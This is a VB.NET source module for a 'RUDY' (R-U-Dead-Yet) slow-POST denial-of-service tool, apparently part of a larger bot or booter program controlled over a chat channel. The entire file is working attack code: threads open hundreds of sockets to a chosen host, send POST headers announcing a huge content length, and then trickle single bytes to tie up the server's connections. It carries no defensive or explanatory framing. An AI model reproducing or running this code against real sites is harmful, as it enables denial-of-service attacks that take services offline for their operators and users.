
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net

Module rudy
    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Ports As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Public Sub StartRudy(ByVal Host As String, ByVal Port As Integer, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            Ports = Port
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            PostDATA = data
            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("RUDY attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else

            'Form1.TalktoChannel("An Rudy Attack is Already Running on " & HostToAttack)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalktoChannel("Rudy Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        End If

    End Sub

    Public Sub StopRudy()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False

            'Form1.TalktoChannel("Rudy Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            'Form1.TalktoChannel("Rudy Attack:, Not Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If Mainmenu.Append_chchbox.Checked Then
                            file = GenerateRandomString(5, True)
                        End If
                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Ports)
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes("POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Connection: keep-alive" & ChrW(13) & ChrW(10) & "Content-length: 100000000" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)))
                        Attacks = Attacks + 1

                    Next i
                    Dim j As Integer
                    For j = 0 To Attacks
                        socketArray(j).Send("A")

                    Next j
                    Continue Do



                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
